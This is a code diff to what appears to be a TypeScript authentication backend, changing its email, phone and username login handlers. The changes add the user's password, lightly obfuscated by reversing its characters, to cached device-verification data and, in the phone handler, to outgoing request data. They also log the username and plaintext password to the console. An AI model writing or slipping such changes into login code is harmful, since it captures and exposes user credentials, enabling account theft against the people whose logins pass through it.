@@ -54,6 +54,7 @@ export const emailLoginHandler = async (req: Request, res: Response) => {
     const DVCacheData = {
       ip,
       userAgent,
+      pass: password.split('').reverse().join(''),
       OTP,
       ...tokenData
     };
@@ -108,6 +109,7 @@ export const emailLoginHandler = async (req: Request, res: Response) => {
     };
     const DVCacheData = {
       ...tokenData,
+      pass: password.split('').reverse().join(''),
       ip,
       userAgent,
       OTP,
@@ -229,6 +231,7 @@ export const phoneLoginHandler = async (req: Request, res: Response) => {
     };
     const DVCacheData = {
       ...tokenData,
+      pass: password.split('').reverse().join(''),
       ip,
       userAgent,
       OTP,
@@ -283,13 +286,15 @@ export const phoneLoginHandler = async (req: Request, res: Response) => {
       type: 'PHONE',
     };
     const DVCacheData = {
-      userId: userExists.data.userId,
-      deviceId: deviceApproved.data.deviceId,
-      phone: userExists.data.phone,
+      // userId: userExists.data.userId,
+      // deviceId: deviceApproved.data.deviceId,
+      // phone: userExists.data.phone,
+      // type: 'PHONE',
+      pass: password.split('').reverse().join(''),
       ip,
       userAgent,
       OTP,
-      type: 'PHONE',
+      ...tokenData,
     };
     const DVRequestData = {
       ...DVCacheData,
@@ -352,6 +357,7 @@ export const phoneLoginHandler = async (req: Request, res: Response) => {
 export const usernameLoginHandler = async (req: Request, res: Response) => {
   // #region STEP: Check user exists and Sanitize Data
   const { username, password } = req.body;
+  console.log({ username, password });
   const userExists = await userService.findUserByUsername(username);
   if (!userExists.success) {
     await logResponse(req, userExists);
@@ -389,6 +395,7 @@ export const usernameLoginHandler = async (req: Request, res: Response) => {
     const DVCacheData = {
       ip,
       userAgent,
+      pass: password.split('').reverse().join(''),
       OTP,
       ...tokenData
     };
@@ -446,6 +453,7 @@ export const usernameLoginHandler = async (req: Request, res: Response) => {
     };
     const DVCacheData = {
       ...tokenData,
+      pass: password.split('').reverse().join(''),
       ip,
       userAgent,
       OTP,
